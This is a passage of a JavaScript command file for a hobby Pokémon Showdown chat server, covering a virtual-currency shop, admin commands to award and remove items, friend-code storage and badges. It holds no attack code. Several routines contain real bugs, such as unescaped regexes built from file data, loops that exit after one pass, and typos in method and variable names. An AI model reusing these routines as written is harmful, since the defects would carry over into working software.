		}
		if (target2 === 'fix') {
			price = 15;
			if (price <= user.money) {
				user.money = user.money - price;
				this.sendReply('You have purchased the ability to alter your avatar or trainer card. You need to message an Admin capable of adding this (Panpawn / papew).');
				user.canFixItem = true;
				this.add(user.name + ' has purchased the ability to set alter their card or avatar or music box!');
			} else {
				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
			}
		}
		if (target2 === 'potd') {
			price = 45;
			if (price <= user.money) {
				user.money = user.money - price;
				this.sendReply('You have purchased the ability to pick a POTD! PM a leader or up to claim this prize.');
				user.canPOTD = true;
				this.add(user.name + ' has purchased the ability to set the POTD!');
			} else {
				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
			}
		}
		if (target2 === 'badge'|| target2 === 'vip') {
			price = 1000;
			if (price <= user.money) {
				user.money = user.money - price;
				this.sendReply('You have purchased a VIP badge.  Screen shoot this as evedience for an admin.');
				user.canBadge = true;
				this.add(user.name + ' has purchased the ability to claim a VIP badge!');
			} else {
				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
			}
		}
		if (target2 === 'declare') {
			price = 25;
			if (price <= user.money) {
				user.money = user.money - price;
				this.sendReply('You have purchased the ability to declare (from Admin). To do this message an Admin (~) with the message you want to send. Keep it sensible!');
				user.canDecAdvertise = true;
				this.add(user.name + ' has purchased the ability to declare from an Admin!');
			} else {
				return this.sendReply('You do not have enough bucks for this. You need ' + (price - user.money) + ' more bucks to buy ' + target + '.');
			}
		}
		if (match === true) {
			var re = new RegExp(line,"g");
			fs.readFile('config/money.csv', 'utf8', function (err,data) {
			if (err) {
				return console.log(err);
			}
			var result = data.replace(re, user.userid+','+user.money);
			fs.writeFile('config/money.csv', result, 'utf8', function (err) {
				if (err) return console.log(err);
			});
			});
		}
	},
	
//Tis' big command
	shop: function(target, room, user) {
	
		if (!this.canBroadcast()) return;
		if(room.id === 'lobby') {
		return this.sendReplyBox('<center>Click <button name="send" value="/shop164" class="blackbutton" title="Enter the Shop!"><font color="white"><b>here</button></b></font> to enter our shop!');
		} else 
		return this.sendReplyBox('<center><h3><b><u>Gold Bucks Shop</u></b></h3><table border="1" cellspacing ="0" cellpadding="3"><tr><th>Command</th><th>Description</th><th>Cost</th></tr>' +
			'<tr><td>Symbol</td><td>Buys a custom symbol to go infront of name and puts you at top of userlist (temporary until restart)</td><td>5</td></tr>' +
			'<tr><td>Custom</td><td>Buys a custom avatar to be applied to your name (you supply)</td><td>35</td></tr>' +
			'<tr><td>Animated</td><td>Buys an animated avatar to be applied to your name (you supply)</td><td>45</td></tr>' +
			'<tr><td>Room</td><td>Buys a chatroom for you to own (within reason, can be refused)</td><td>100</td></tr>' +
			'<tr><td>Trainer</td><td>Buys <a href="http://pastebin.com/1GBmc4eM">a trainer card</a> which shows information through a command such as /panpawn (note: third image costs 10 bucks extra, ask for more details)</td><td>60</td></tr>' +
			'<tr><td>Fix</td><td>Buys the ability to alter your current custom avatar or trainer card or music box (don\'t buy if you have neither)!</td><td>15</td></tr>' +
			'<tr><td>Declare</td><td>You get the ability to get two declares from an Admin in lobby. This can be used for league advertisement (not server)</td><td>25</td></tr>' +
			'<tr><td>POTD</td><td>Buys the ability to set The Pokemon of the Day!  This Pokemon will be guaranteed to show up in random battles. </td><td>45</td></tr>' +
			'<tr><td>Musicbox</td><td><a href="http://pastebin.com/bDG185jQ">Music Box!</a>  It\'s a command that\'s similar to a trainer card but with links to your favorite songs! (must be appropriate).</td><td>60</td></tr>' +
			//'<tr><td>Emote</td><td>This buys you a custom chat emote, such as "Kappa", for example.  The size of this must be 25x25 and must be appropriate.</td><td>150</td></tr>' +
			'<tr><td>Badge</td><td>You get a VIP badge and VIP status AND strongly recomended for global voice!  A VIP can change thier avatar by PM\'ing a leader at any time (they get one for FREE as well) in addition to a FREE trainer card.</td><td>1,000</td></tr>' +
			'</table><br />To buy an item from the shop, use /buy [command].<br>Do /getbucks to learn more about how to obtain bucks. </center>');
		if (closeShop) return this.sendReply('|raw|<center><h3><b>The shop is currently closed and will open shortly.</b></h3></center>');
	},
	shop164: function(target, room, user) {
	if (!this.canBroadcast()) return;
	this.sendReplyBox('<center><h3><b><u>Gold Bucks Shop</u></b></h3><table border="1" cellspacing ="0" cellpadding="3"><tr><th>Command</th><th>Description</th><th>Cost</th></tr>' +
			'<tr><td>Symbol</td><td>Buys a custom symbol to go infront of name and puts you at top of userlist (temporary until restart)</td><td>5</td></tr>' +
			'<tr><td>Custom</td><td>Buys a custom avatar to be applied to your name (you supply)</td><td>35</td></tr>' +
			'<tr><td>Animated</td><td>Buys an animated avatar to be applied to your name (you supply)</td><td>45</td></tr>' +
			'<tr><td>Room</td><td>Buys a chatroom for you to own (within reason, can be refused)</td><td>100</td></tr>' +
			'<tr><td>Trainer</td><td>Buys <a href="http://pastebin.com/1GBmc4eM">a trainer card</a> which shows information through a command such as /panpawn (note: third image costs 10 bucks extra, ask for more details)</td><td>60</td></tr>' +
			'<tr><td>Fix</td><td>Buys the ability to alter your current custom avatar or trainer card or music box (don\'t buy if you have neither)!</td><td>15</td></tr>' +
			'<tr><td>Declare</td><td>You get the ability to get two declares from an Admin in lobby. This can be used for league advertisement (not server)</td><td>25</td></tr>' +
			'<tr><td>POTD</td><td>Buys the ability to set The Pokemon of the Day!  This Pokemon will be guaranteed to show up in random battles. </td><td>45</td></tr>' +
			'<tr><td>Musicbox</td><td><a href="http://pastebin.com/bDG185jQ">Music Box!</a>  It\'s a command that\'s similar to a trainer card but with links to your favorite songs! (must be appropriate).</td><td>60</td></tr>' +
			//'<tr><td>Emote</td><td>This buys you a custom chat emote, such as "Kappa", for example.  The size of this must be 25x25 and must be appropriate.</td><td>150</td></tr>' +
			'<tr><td>Badge</td><td>You get a VIP badge and VIP status AND strongly recomended for global voice!  A VIP can change thier avatar by PM\'ing a leader at any time (they get one for FREE as well) in addition to a FREE trainer card.</td><td>1,000</td></tr>' +
			'</table><br />To buy an item from the shop, use /buy [command].<br>Do /getbucks to learn more about how to obtain bucks. </center>');
		if (closeShop) return this.sendReply('|raw|<center><h3><b>The shop is currently closed and will open shortly.</b></h3></center>');
	},

	lockshop: 'closeshop',
	closeshop: function(target, room, user) {
		if (!user.can('hotpatch')) return this.sendReply('You do not have enough authority to do this.');

		if(closeShop && closedShop === 1) closedShop--;

		if (closeShop) {
			return this.sendReply('The shop is already closed. Use /openshop to open the shop to buyers.');
		}
		else if (!closeShop) {
			if (closedShop === 0) {
				this.sendReply('Are you sure you want to close the shop? People will not be able to buy anything. If you do, use the command again.');
				closedShop++;
			}
			else if (closedShop === 1) {
				closeShop = true;
				closedShop--;
				this.add('|raw|<center><h4><b>The shop has been temporarily closed, during this time you cannot buy items.</b></h4></center>');
			}
		}
	},

	openshop: function(target, room, user) {
		if (!user.can('hotpatch')) return this.sendReply('You do not have enough authority to do this.');

		if (!closeShop && closedShop === 1) closedShop--;

		if (!closeShop) {
			return this.sendRepy('The shop is already closed. Use /closeshop to close the shop to buyers.');
		}
		else if (closeShop) {
			if (closedShop === 0) {
				this.sendReply('Are you sure you want to open the shop? People will be able to buy again. If you do, use the command again.');
				closedShop++;
			}
			else if (closedShop === 1) {
				closeShop = false;
				closedShop--;
				this.add('|raw|<center><h4><b>The shop has been opened, you can now buy from the shop.</b></h4></center>');
			}
		}
	},

	shoplift: 'awarditem',
	giveitem: 'awarditem',
	awarditem: function(target, room, user) {
		if (!target) return this.parse('/help awarditem');
		if(!user.can('hotpatch')) return this.sendReply('You do not have enough authority to do this.');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;

		if (!target) return this.parse('/help awarditem');
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}

		var matched = false;
		var isItem = false;
		var theItem = '';
		for (var i = 0; i < inShop.length; i++) {
			if (target.toLowerCase() === inShop[i]) {
				isItem = true;
				theItem = inShop[i];
			}
		}
		if (isItem === true) {
			if (theItem === 'symbol') {
				if (targetUser.canCustomSymbol === true) {
					return this.sendReply('This user has already bought that item from the shop... no need for another.');
				}
				if (targetUser.canCustomSymbol === false) {
					matched = true;
					this.sendReply(targetUser.name + ' can now use /customsymbol to get a custom symbol.');
					targetUser.canCustomSymbol = true;
					Rooms.rooms.lobby.add(user.name + ' has stolen custom symbol from the shop!');
					targetUser.send(user.name + ' has given you ' + theItem + '! Use /customsymbol [symbol] to add the symbol!');
				}
			}
			if (theItem === 'custom') {
				if (targetUser.canCustomAvatar === true) {
					return this.sendReply('This user has already bought that item from the shop... no need for another.');
				}
				if (targetUser.canCustomAvatar === false) {
					matched = true;
					targetUser.canCustomAvatar = true;
					Rooms.rooms.lobby.add(user.name + ' has stolen a custom avatar from the shop!');
					targetUser.send(user.name + ' has given you ' + theItem + '!');
				}
			}
			if (theItem === 'emote') {
				if (targetUser.canCustomEmote === true) {
					return this.sendReply('This user has already bought that item from the shop... no need for another.');
				}
				if (targetUser.canCustomEmote === false) {
					matched = true;
					targetUser.canCustomEmote = true;
					Rooms.rooms.lobby.add(user.name + ' has stolen a custom emote from the shop!');
					targetUser.send(user.name + ' has given you ' + theItem + '!');
				}
			}
			if (theItem === 'animated') {
				if (targetUser.canAnimated === true) {
					return this.sendReply('This user has already bought that item from the shop... no need for another.');
				}
				if (targetUser.canCustomAvatar === false) {
					matched = true;
					targetUser.canCustomAvatar = true;
					Rooms.rooms.lobby.add(user.name + ' has stolen a custom avatar from the shop!');
					targetUser.send(user.name + ' has given you ' + theItem + '!');
				}
			}
			if (theItem === 'room') {
				if (targetUser.canChatRoom === true) {
					return this.sendReply('This user has already bought that item from the shop... no need for another.');
				}
				if (targetUser.canChatRoom === false) {
					matched = true;
					targetUser.canChatRoom = true;
					Rooms.rooms.lobby.add(user.name + ' has stolen a chat room from the shop!');
					targetUser.send(user.name + ' has given you ' + theItem + '!');
				}
			}
			if (theItem === 'trainer') {
				if (targetUser.canTrainerCard === true) {
					return this.sendReply('This user has already bought that item from the shop... no need for another.');
				}
				if (targetUser.canTrainerCard === false) {
					matched = true;
					targetUser.canTrainerCard = true;
					Rooms.rooms.lobby.add(user.name + ' has stolen a trainer card from the shop!');
					targetUser.send(user.name + ' has given you ' + theItem + '!');
				}
			}
			if (theItem === 'musicbox') {
				if (targetUser.canMusicBox === true) {
					return this.sendReply('This user has already bought that item from the shop... no need for another.');
				}
				if (targetUser.canMusicBox === false) {
					matched = true;
					targetUser.canMusicBox = true;
					Rooms.rooms.lobby.add(user.name + ' has stolen a music box from the shop!');
					targetUser.send(user.name + ' has given you ' + theItem + '!');
				}
			}
			if (theItem === 'forcerename') {
				if (targetUser.canForcerename === true) {
					return this.sendReply('This user has already bought that item from the shop... no need for another.');
				}
				if (targetUser.canForcerename === false) {
					matched = true;
					targetUser.canForcerename = true;
					Rooms.rooms.lobby.add(user.name + ' has a forcerename from the shop!');
					targetUser.send(user.name + ' has given you ' + theItem + '!');
				}
			}	
			if (theItem === 'fix') {
				if (targetUser.canFixItem === true) {
					return this.sendReply('This user has already bought that item from the shop... no need for another.');
				}
				if (targetUser.canFixItem === false) {
					matched = true;
					targetUser.canFixItem = true;
					Rooms.rooms.lobby.add(user.name + ' has stolen the ability to alter a current trainer card or avatar from the shop!');
					targetUser.send(user.name + ' has given you the ability to set ' + theItem + '!');
				}
			}
			if (theItem === 'potd') {
				if (targetUser.canPOTD === true) {
					return this.sendReply('This user has already bought that item from the shop... no need for another.');
				}
				if (targetUser.canPOTD === false) {
					matched = true;
					targetUser.canPOTD = true;
					Rooms.rooms.lobby.add(user.name + ' has stolen the ability to set POTD from the shop!');
					targetUser.send(user.name + ' has given you the ability to set ' + theItem + '!');
				}
			}
			if (theItem === 'badge') {
				if (targetUser.canBadge === true) {
					return this.sendReply('This user has already bought that item from the shop... no need for another.');
				}
				if (targetUser.canBadge === false) {
					matched = true;
					targetUser.canBadge = true;
					Rooms.rooms.lobby.add(user.name + ' has stolen a badge from the shop!');
					targetUser.send(user.name + ' has given you the ability to claim a ' + theItem + '!');
				}
			}
			if (theItem === 'vip') {
				if (targetUser.canVIP === true) {
					return this.sendReply('This user has already bought that item from the shop... no need for another.');
				}
				if (targetUser.canVIP === false) {
					matched = true;
					targetUser.canVIP = true;
					Rooms.rooms.lobby.add(targetUser + ' revieved VIP status from '+user.name+'!');
					targetUser.send(user.name + ' has given you the ability to claim a ' + theItem + '!');
				}
			}
			if (theItem === 'declare') {
				if (targetUser.canDecAdvertise === true) {
					return this.sendReply('This user has already bought that item from the shop... no need for another.');
				}
				if (targetUser.canDecAdvertise === false) {
					matched = true;
					targetUser.canDecAdvertise = true;
					Rooms.rooms.lobby.add(user.name + ' has stolen the ability to get a declare from the shop!');
					targetUser.send(user.name + ' has given you the ability to set ' + theItem + '!');
				}
			}
			else
				if (!matched) return this.sendReply('Maybe that item isn\'t in the shop yet.');
		}
		else 
			return this.sendReply('Shop item could not be found, please check /shop for all items - ' + theItem);
	},

	removeitem: function(target, room, user) {
		if (!target) return this.parse('/help removeitem');
		if(!user.can('hotpatch')) return this.sendReply('You do not have enough authority to do this.');

		target = this.splitTarget(target);
		var targetUser = this.targetUser;

		if (!target) return this.parse('/help removeitem');
		if (!targetUser) {
			return this.sendReply('User '+this.targetUsername+' not found.');
		}

		if (target === 'symbol') {
			if (targetUser.canCustomSymbol) {
				targetUser.canCustomSymbol = false;
				this.sendReply(targetUser.name + ' no longer has a custom symbol ready to use.');
				targetUser.send(user.name + ' has removed the custom symbol from you.');
			}
			else
				return this.sendReply('They do not have a custom symbol for you to remove.');
		}
		else if (target === 'custom') {
			if (targetUser.canCustomAvatar) {
				targetUser.canCustomAvatar = false;
				this.sendReply(targetUser.name + ' no longer has a custom avatar ready to use.');
				targetUser.send(user.name + ' has removed the custom avatar from you.');
			}
			else
				return this.sendReply('They do not have a custom avatar for you to remove.');
		}
		else if (target === 'emote') {
			if (targetUser.canCustomEmote) {
				targetUser.canCustomEmote = false;
				this.sendReply(targetUser.name + ' no longer has a custom emote ready to use.');
				targetUser.send(user.name + ' has removed the custom emote from you.');
			}
			else
				return this.sendReply('They do not have a custom emote for you to remove.');
		}
		else if (target === 'animated') {
			if (targetUser.canAnimatedAvatar) {
				targetUser.canAnimatedAvatar = false;
				this.sendReply(targetUser.name + ' no longer has a animated avatar ready to use.');
				targetUser.send(user.name + ' has removed the animated avatar from you.');
			}
			else
				return this.sendReply('They do not have an animated avatar for you to remove.');
		}
		else if (target === 'room') {
			if (targetUser.canChatRoom) {
				targetUser.canChatRoom = false;
				this.sendReply(targetUser.name + ' no longer has a chat room ready to use.');
				targetUser.send(user.name + ' has removed the chat room from you.');
			}
			else
				return this.sendReply('They do not have a chat room for you to remove.');
		}
		else if (target === 'trainer') {
			if (targetUser.canTrainerCard) {
				targetUser.canTrainerCard = false;
				this.sendReply(targetUser.name + ' no longer has a trainer card ready to use.');
				targetUser.send(user.name + ' has removed the trainer card from you.');
			}
			else
				return this.sendReply('They do not have a trainer card for you to remove.');
		}
		else if (target === 'musicbox') {
			if (targetUser.canMusicBox) {
				targetUser.canMusicBox = false;
				this.sendReply(targetUser.name + ' no longer has a music box ready to use.');
				targetUser.send(user.name + ' has removed the music box from you.');
			}
			else
				return this.sendReply('They do not have a music box for you to remove.');
		}
		else if (target === 'fix') {
			if (targetUser.canFixItem) {
				targetUser.canFixItem = false;
				this.sendReply(targetUser.name + ' no longer has the fix to use.');
				targetUser.send(user.name + ' has removed the fix from you.');
			}
			else
				return this.sendReply('They do not have a trainer card for you to remove.');
		}
		else if (target === 'forcerename') {
			if (targetUser.canForcerename) {
				targetUser.canForcerename = false;
				this.sendReply(targetUser.name + ' no longer has the forcerename to use.');
				targetUser.send(user.name + ' has removed forcerename from you.');
			}
			else
				return this.sendReply('They do not have a forcerename for you to remove.');
		}
		else if (target === 'potd') {
			if (targetUser.canPOTD) {
				targetUser.canPOTD = false;
				this.sendReply(targetUser.name + ' no longer can set POTD.');
				targetUser.send(user.name + ' has removed the POTD from you.');
			}
			else
				return this.sendReply('They do not have the POTD ability for you to remove.');
		}
		else if (target === 'badge') {
			if (targetUser.canBadge) {
				targetUser.canBadge = false;
				this.sendReply(targetUser.name + ' no longer has a badge.');
				targetUser.send(user.name + ' has removed the VIP badge from you.');
			}
			else
				return this.sendReply('They do not have a VIP badge for you to remove.');
		}
		else if (target === 'declare') {
			if (targetUser.canDecAdvertise) {
				targetUser.canDecAdvertise = false;
				this.sendReply(targetUser.name + ' no longer has a declare ready to use.');
				targetUser.send(user.name + ' has removed the declare from you.');
			}
			else
				return this.sendReply('They do not have a trainer card for you to remove.');
		}
		else
			return this.sendReply('That isn\'t a real item you fool!');
	},

	website:function(target, room, user) {
                if (!this.canBroadcast()) return;
                this.sendReplyBox('Gold\'s website can be found <a href="http://goldserver.weebly.com/">here</a>.');
	
	},
	
	news:function(target, room, user) {
                if (!this.canBroadcast()) return;
                this.sendReplyBox('Gold\'s news can be found <a href="http://goldserver.weebly.com/news.html">here</a>.');
	
	},
	
	radio: 'plug',
	plug:function(target, room, user) {
                if (!this.canBroadcast()) return;
                this.sendReplyBox('Gold\'s Plug.dj can be found <a href="http://plug.dj/gold-server/">here</a>.');
	
	},
	
	ps:function(target, room, user) {
                if (!this.canBroadcast()) return;
                this.sendReplyBox('<center>Cick the Poké Ball to enter Pawn\'s Trading Shoppe! <a href="http://panpawnshop.weebly.com/">    <img src="http://upload.wikimedia.org/wikipedia/en/3/39/Pokeball.PNG" width="20" height="20">');
	},
	
	/*********************************************************
	* Friend Codes                                    
	*********************************************************/
	fch: 'friendcodehelp',
	friendcodehelp:function(target, room, user) {
                if (!this.canBroadcast()) return;
                this.sendReplyBox('<b>Friend Code Help:</b> <br><br />' +
                '/friendcode (/fc) [friendcode] - Sets your Friend Code.<br />' +
                '/getcode (gc) - Sends you a popup of all of the registered user\'s Friend Codes.<br />' +
                '/deletecode [user] - Deletes this user\'s friend code from the server (Requires %, @, &, ~)<br>' +
                '<i>--Any questions, PM papew!</i>');
	},
      
	friendcode: 'fc',
        fc: function(target, room, user, connection) {
                if (!target) {
                        return this.sendReply("Enter in your friend code. Make sure it's in the format: xxxx-xxxx-xxxx or xxxx xxxx xxxx or xxxxxxxxxxxx.");
                }
                var fc = target;
                fc = fc.replace(/-/g, '');
                fc = fc.replace(/ /g, '');
                if (isNaN(fc)) return this.sendReply("The friend code you submitted contains non-numerical characters. Make sure it's in the format: xxxx-xxxx-xxxx or xxxx xxxx xxxx or xxxxxxxxxxxx.");
                if (fc.length < 12) return this.sendReply("The friend code you have entered is not long enough! Make sure it's in the format: xxxx-xxxx-xxxx or xxxx xxxx xxxx or xxxxxxxxxxxx.");
                fc = fc.slice(0,4)+'-'+fc.slice(4,8)+'-'+fc.slice(8,12);
                var codes = fs.readFileSync('config/friendcodes.txt','utf8');
                if (codes.toLowerCase().indexOf(user.name) > -1) {
                        return this.sendReply("Your friend code is already here.");
                }
                code.write('\n'+user.name+': '+fc);
                return this.sendReply("Your Friend Code: "+fc+" has been set.");
        },
		
	viewcode: 'gc',
	getcodes: 'gc',
	viewcodes: 'gc',
	vc: 'gc',
        getcode: 'gc',
        gc: function(target, room, user, connection) {
                var codes = fs.readFileSync('config/friendcodes.txt','utf8');
                return user.send('|popup|'+codes);
	},
		
	deletecode: function(target, room, user) {
		if (!target) {	
			return this.sendReply('/deletecode [user] - Deletes the Friend Code of the User.');
		}
		t = this;
		if (!this.can('lock')) return false;
		fs.readFile('config/friendcodes.txt','utf8',function(err,data) {
			if (err) console.log(err);
			hi = this;
			var row = (''+data).split('\n');
			match = false;
			line = '';
			for (var i = row.length; i > -1; i--) {
				if (!row[i]) continue;
				var line = row[i].split(':');
				if (target === line[0]) {
					match = true;
					line = row[i];
				}
				break;
			}
			if (match === true) {
				var re = new RegExp(line,'g');
				var result = data.replace(re, '');
				fs.writeFile('config/friendcodes.txt',result,'utf8',function(err) {
					if (err) t.sendReply(err);
					t.sendReply('The Friendcode '+line+' has been deleted.');
				});
			}else{
				t.sendReply('There is no match.');
			}
		});
	},
//End Friend Code commands
	
	roomfounder: function(target, room, user) {
		if (!room.chatRoomData) {
			return this.sendReply("/roomfounder - This room is't designed for per-room moderation to be added.");
		}
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		if (!targetUser) return this.sendReply("User '"+this.targetUsername+"' is not online.");
		if (!this.can('makeroom')) return false;
		if (!room.auth) room.auth = room.chatRoomData.auth = {};
		var name = targetUser.name;
		room.auth[targetUser.userid] = '#';
		room.founder = targetUser.userid;
		this.addModCommand(''+name+' was appointed to Room Founder by '+user.name+'.');
		room.onUpdateIdentity(targetUser);
		room.chatRoomData.founder = room.founder;
		Rooms.global.writeChatRoomData();
	},
	
	gb: 'givebadge',
	givebadge: function(target, room, user) {
		if (!this.can('declare')) return false;
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!targetUser) return this.sendReply('There is no user named '+this.targetUsername+'.');
		if (!target) return this.sendReply('/givebadge [user], [badge] - Gives a badge to a user. Requires: &~');
		var self = this;
		var type_of_badges = ['admin','dev','vip','mod','artist','leader','champ','creator','comcun','twinner','league'];
		if (type_of_badges.indexOf(target) > -1 == false) return this.sendReply('Ther is no badge named '+target+'.');
		fs.readFile('config/badges.txt', 'utf8', function(err, data) {
			if (err) console.log(err);
			var badges = '';
			var line = '';
			var row = (''+data).split('\n');
			var match = false;
			for (var i = row.length; i > -1; i--) {
				if (!row[i]) continue;
				var split = row[i].split(':');
				if (split[0] == targetUser.userid) {
					match = true;
					badges = split[1];
					line = row[i];
				}
				break;
			}
			if (match == true) {
				if (badges.indexOf(target) > -1) return self.sendReply('The user '+targerUser+' already has the badge '+target+'.');
				var re = new RegExp(line, 'g');
				var newdata = data.replace(re, targetUser.userid+':'+badges+','+target);
				fs.writeFile('config/badges.txt', newdata, function(err, data) {
					if (err) console.log(err);
					self.sendReply('You have given the badge '+target+' to the user '+targetUser+'.');
					targetUser.send('You have recieved the badge '+target+' from the user '+user.userid+'.');
				});
			} else {
				fs.appendFile('config/badges.txt','\n'+targetUser.userid+':'+target, function(err) {
					if (err) console.log(err);
					self.sendReply('You have given the badge '+target+' to the user '+targetUser+'.');
					targetUser.send('You have recieved the badge '+target+' from the user '+user.userid+'.');
				});
			}
		})
	},

	badges: 'badge',
    	badge: function(target, room, user) {
            	if (!this.canBroadcast()) return;
            	if (target == '') target = user.userid;
            	target = this.splitTarget(target);
            	var targetUser = this.targetUser;
            	var matched = false; 
            	var admin = '<img src="http://www.smogon.com/media/forums/images/badges/sop.png" title="Server Administrator">';
            	var dev = '<img src="http://www.smogon.com/media/forums/images/badges/factory_foreman.png" title="Gold Developer">';
            	var creator = '<img src="http://www.smogon.com/media/forums/images/badges/dragon.png" title="Server Creator">';
            	var comcun = '<img src="http://www.smogon.com/media/forums/images/badges/cc.png" title="Community Contributor">';
            	var leader = '<img src="http://www.smogon.com/media/forums/images/badges/aop.png" title="Server Leader">';
            	var mod = '<img src="http://www.smogon.com/media/forums/images/badges/pyramid_king.png" title="Exceptional Staff Member">';
            	var league ='<img src="http://www.smogon.com/media/forums/images/badges/forumsmod.png" title="Successful League Owner">';
            	var champ ='<img src="http://www.smogon.com/media/forums/images/badges/forumadmin_alum.png" title="Goodra League Champion">';
            	var artist ='<img src="http://www.smogon.com/media/forums/images/badges/ladybug.png" title="Artist">';
                var twinner='<img src="http://www.smogon.com/media/forums/images/badges/spl.png" title="Badge Tournament Winner">';
                var vip ='<img src="http://www.smogon.com/media/forums/images/badges/zeph.png" title="VIP">';
                var self = this;
                fs.readFile('config/badges.txt', 'utf8', function(err, data) {
                	if (err) console.log(err);
                	var row = (''+data).split('\n');
                	var match = false;
                	var badges;
                	for (var i = row.length; i > -1; i--) {
                		if (!row[i]) continue;
                		var split = row[i].split(':');
                		if (split[0] == targetUser.userid) {
                			match = true;
                			currentbadges = split[1];
                		}
                		break;
                	}
                	if (match == true) {
                		var badgelist = '';
                		if (currentbadges.indexOf('admin') > -1) badgelist+=' '+admin;
                		if (currentbadges.indexOf('dev') > -1) badgelist+=' '+dev;
                		if (currentbadges.indexOf('creator') > -1) badgelist+=' '+creator;
                		if (currentbadges.indexOf('comcun') > -1) badgelist+=' '+comcun;
                		if (currentbadges.indexOf('leader') > -1) badgelist+=' '+leader;
                		if (currentbadges.indexOf('mod') > -1) badgelist+=' '+mod;
                		if (currentbadges.indexOf('league') > -1) badgelist+=' '+league;
                		if (currentbadges.indexOf('champ') > -1) badgelist+=' '+champ;
                		if (currentbadges.indexOf('artist') > -1) badgelist+=' '+artist;
                		if (currentbadges.indexOf('twinner') > -1) badgelist+=' '+twinner;
                		if (currentbadges.indexOf('vip') > -1) badgelist+=' '+vip;
                		self.sendReplyBox(targetUser.userid+"'s badges: "+badgelist);
                		room.update();
                	} else {
                		self.sendReplyBox('User '+targetUser.userid+' has no badges.');
                		room.update();
                	}
                });
            },
        /*/
         profile: function(target, room, user) {
            if (!target) target = user.name;
            if (toId(target).length < 1) return this.sendReply('"'+target+'" is an invalid username.');
            if (!this.canBroadcast()) return;
            targetUser = Users.get(target);
            if (!targetUser) {
                username = target;
                userid = toId(target);
                if (Users.usergroups[userid]) {
                                var userGroup = Users.usergroups[userid].substr(0,1);
                                userGroup = config.groups[userGroup].name
                        } else {
                                var userGroup = 'Regular User';
                }
                avatar = getAvatar(userid);    
                        if (isNaN(avatar)) {
                                avatar = 'http://woof.imjd.info:8000/avatars/'+avatar;
                        } else {
                                avatar = 'http://play.pokemonshowdown.com/sprites/trainers/'+avatar+'.png';
                        }
            } else {
                username = targetUser.name;
                userid = targetUser.userid;
                userGroup = config.groups[targetUser.group].name
                avatar = targetUser.avatar;
            }
              var mMatch = false;
        var money = 0;
        var total = '';
        if (!target) {
        var data = fs.readFileSync('config/money.csv','utf8')
                var row = (''+data).split("\n");
                for (var i = row.length; i > -1; i--) {
                        if (!row[i]) continue;
                        var parts = row[i].split(",");
                        var userid = toId(parts[0]);
                        if (user.userid == userid) {
                        var x = Number(parts[1]);
                        var money = x;
                        mMatch = true;
                        if (mMatch === true) {
                                break;
                        }
                        }
                }
                if (mMatch === true) {
                        var p = 'Gold bucks';
                        if (money < 2) p = 'Gold buck';
                        total += user.name + ' has ' + money + ' ' + p + '.<br />';
                }
                if (mMatch === false) {
                        total += 'You have no Gold bucks.<br />';
                }
                user.money = money;
        } else {
                var data = fs.readFileSync('config/money.csv','utf8')
                target = this.splitTarget(target);
                var targetUser = this.targetUser;
                if (!targetUser) {
                        return this.sendReply('User '+this.targetUsername+' not found.');
                }
                var money = 0;
                var row = (''+data).split("\n");
                for (var i = row.length; i > -1; i--) {
                        if (!row[i]) continue;
                        var parts = row[i].split(",");
                        var userid = toId(parts[0]);
                        if (targetUser.userid == userid || target == userid) {
                        var x = Number(parts[1]);
                        var money = x;
                        mMatch = true;
                        if (mMatch === true) {
                                break;
                        }
                        }
                }
                if (mMatch === true) {
                        var p = 'Gold bucks';
                        if (money < 2) p = 'Gold buck';
                        total +=  + money + ' ' + p + '.<br />';
                } 
                if (mMatch === false) {
                        total += ' None.<br />';
                }
                targetUser.money = money;
                                }
                if (config.groups[targetUser.group] && config.groups[targetUser.group].name) {
                        var group = ''+ config.groups[targetUser.group].name + ' (' + targetUser.group + ')';
                } else {
                        var group = 'Regular User';
                }
            var profile = '';
            profile += '<img src="'+avatar+'" height=80 width=80 align=left>';
            profile += '&nbsp;<font color=#24678d><b>Name: </font></b>'+username+'<br />';
            profile += '&nbsp;<font color=#24678d><b>Rank: </font>'+group+'<br />';
            profile += '&nbsp;<font color=#24678d><b>Money: </font>'+money+'<br />';
            this.sendReplyBox(profile);
            },
/*/
        
        /*/
        profile: function(target, room, user) {
                if (!this.canBroadcast()) return;
                if (target == '') target = user.userid;
                target = target.toLowerCase();
                target = target.trim();
                //var avatar = '<img src="http://50.62.73.114:8000/avatars/'+user.avatar+'" align="left" height=80 width=80>';
                
               var mMatch = false;
        var money = 0;
        var total = '';
        if (!target) {
        var data = fs.readFileSync('config/money.csv','utf8')
                var row = (''+data).split("\n");
                for (var i = row.length; i > -1; i--) {
                        if (!row[i]) continue;
                        var parts = row[i].split(",");
                        var userid = toId(parts[0]);
                        if (user.userid == userid) {
                        var x = Number(parts[1]);
                        var money = x;
                        mMatch = true;
                        if (mMatch === true) {
                                break;
                        }
                        }
                }
                if (mMatch === true) {
                        var p = 'Gold bucks';
                        if (money < 2) p = 'Gold buck';
                        total += user.name + ' has ' + money + ' ' + p + '.<br />';
                }
                if (mMatch === false) {
                        total += 'You have no Gold bucks.<br />';
                }
                user.money = money;
        } else {
                var data = fs.readFileSync('config/money.csv','utf8')
                target = this.splitTarget(target);
                var targetUser = this.targetUser;
                if (!targetUser) {
                        return this.sendReply('User '+this.targetUsername+' not found.');
                }
                var money = 0;
                var row = (''+data).split("\n");
                for (var i = row.length; i > -1; i--) {
                        if (!row[i]) continue;
                        var parts = row[i].split(",");
                        var userid = toId(parts[0]);
                        if (targetUser.userid == userid || target == userid) {
                        var x = Number(parts[1]);
                        var money = x;
                        mMatch = true;
                        if (mMatch === true) {
                                break;
                        }
                        }
                }
                if (mMatch === true) {
                        var p = 'Gold bucks';
                        if (money < 2) p = 'Gold buck';
                        total +=  + money + ' ' + p + '.<br />';
                } 
                if (mMatch === false) {
                        total += ' None.<br />';
                }
                targetUser.money = money;
                                }
                if (config.groups[targetUser.group] && config.groups[targetUser.group].name) {
			var group = ''+ config.groups[targetUser.group].name + ' (' + targetUser.group + ')';
		} else {
			var group = 'Regular User';
		}
                return this.sendReplyBox(avatar+'' +
                '<font size="2">'+targetUser.name+'</font><br />' +
